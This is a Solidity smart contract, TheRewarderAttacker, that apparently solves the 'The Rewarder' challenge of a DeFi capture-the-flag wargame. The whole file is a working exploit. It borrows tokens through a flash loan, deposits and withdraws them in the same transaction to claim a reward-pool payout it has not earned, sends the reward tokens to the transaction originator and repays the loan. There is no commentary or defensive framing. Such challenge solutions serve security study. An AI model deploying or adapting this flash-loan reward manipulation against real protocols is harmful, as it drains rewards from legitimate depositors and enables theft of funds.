// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ILenderPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

interface IERC20 {
    function transfer(address receiver, uint256 amount) external;
    function balanceOf(address owner) external returns (uint256);
    function approve(address spender, uint256 amount) external;
}

contract TheRewarderAttacker {
    ILenderPool private immutable lenderPool;
    ITheRewarderPool private immutable theRewarderPool;
    IERC20 private immutable rewardToken;
    IERC20 private immutable valueableToken;

    constructor(address pool, address rewardedPool, address tokenAddr, address valuableTokenAddr) {
        lenderPool = ILenderPool(pool);
        theRewarderPool = ITheRewarderPool(rewardedPool);
        rewardToken = IERC20(tokenAddr);
        valueableToken = IERC20(valuableTokenAddr);
    }

    function receiveFlashLoan(uint256 amount) external {
        valueableToken.approve(address(theRewarderPool), 10000000 ether);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
        valueableToken.transfer(address(lenderPool), amount);
    }

    function executeFlashLoan(uint256 amount) external {
        lenderPool.flashLoan(amount);
    }
}